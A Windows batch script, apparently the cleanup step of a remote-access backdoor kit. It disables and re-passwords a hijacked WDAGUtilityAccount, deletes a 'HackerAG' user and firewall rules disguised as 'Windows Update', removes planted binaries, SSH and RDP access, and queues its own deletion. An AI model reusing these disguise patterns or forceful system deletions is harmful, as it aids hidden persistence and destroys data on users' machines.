net user WDAGUtilityAccount /active:no | echo .
net user HackerAG /delete | echo .
net user WDAGUtilityAccount 29380523952697kfhskdfhkhsdfkjshdfkhHAKFAKFGUISGNSIN | echo .
net localgroup administratoren /remove WDAGUtilityAccount | echo .
wmic UserAccount where Name="WDAGUtilityAccount" set PasswordExpires=True | echo .
netsh advfirewall firewall delete rule name="Windows Update" | echo .
netsh advfirewall firewall delete rule name="UpdateTask1" | echo .
netsh advfirewall firewall delete rule name="UpdateTask0" | echo .
rmdir /s /q C:\Windows\System32\java | echo .
rmdir /s /q C:\ProgramData\ssh | echo .
del C:\Windows\System32\nircmd.exe | echo .
del C:\Windows\System32\nircmdc.exe | echo .
rmdir /s /q C:\Windows\System32\java | echo .
del C:\Windows\System32\install.done | echo .
rmdir /s /q C:\Users\WDAGUtilityAccount | echo .
rmdir /s /q C:\Users\WDAGUtilityAccount.%computername% | echo .
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f | echo .
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 | echo .
cls
powershell Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 | echo .
echo del C:\Windows\System32\uninstall.bat >> C:\$Recycle.Bin\bye.bat | echo .
echo del C:\Windows\System32\uninstall_prep.bat >> C:\$Recycle.Bin\bye.bat | echo .
